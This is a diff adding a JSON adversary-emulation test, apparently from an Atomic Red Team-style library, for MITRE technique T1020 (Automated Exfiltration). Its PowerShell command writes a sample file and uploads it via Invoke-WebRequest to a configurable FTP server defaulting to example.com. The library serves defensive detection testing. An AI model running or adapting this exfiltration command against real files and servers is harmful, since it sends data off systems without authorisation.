@@ -1,0 +1,41 @@
+{
+    "name": "Exfiltration via Encrypted FTP",
+    "description": "Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"#{sampleFile}\" -Value $sampleData\n$ftpUrl = \"#{ftpServer}\"\n$creds = Get-Credential -Credential \"#{credentials}\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"#{sampleFile}\" -Credential $creds\n",
+        "cleanup_command": "Remove-Item -Path \"#{sampleFile}\" -ErrorAction Ignore\n",
+        "type": "Command Executor"
+    },
+    "id": "T1020",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Automated Exfiltration",
+    "source": "ART",
+    "uuid": "5b380e96-b0ef-4072-8a8e-f194cb9eb9ac",
+    "arguments": {
+        "sampleFile": {
+            "description": "Path of the sample file to exfiltrate.",
+            "type": "String",
+            "default": "C:\\temp\\T1020__FTP_sample.txt"
+        },
+        "ftpServer": {
+            "description": "FTP server URL.",
+            "type": "Url",
+            "default": "ftp://example.com"
+        },
+        "credentials": {
+            "description": "FTP server credentials.",
+            "type": "String",
+            "default": "[user:password]"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
